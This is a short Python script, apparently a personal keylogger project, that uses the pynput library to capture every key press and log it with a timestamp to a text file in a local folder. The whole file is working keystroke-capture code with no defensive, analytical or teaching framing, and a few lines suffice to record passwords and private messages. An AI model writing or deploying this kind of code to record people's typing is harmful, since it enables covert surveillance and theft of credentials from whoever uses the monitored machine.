from pynput.keyboard import Listener, Key
import logging, keyboard, threading

log_pathdir = r"C:/Users/Maaz/Documents/Programs/Python/ALL Programs/Keylogger/"
logging.basicConfig(filename=(log_pathdir + 'log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def func(temp):
    logging.info(str(temp))


with Listener(on_press=func) as key_listener:
    key_listener.join()
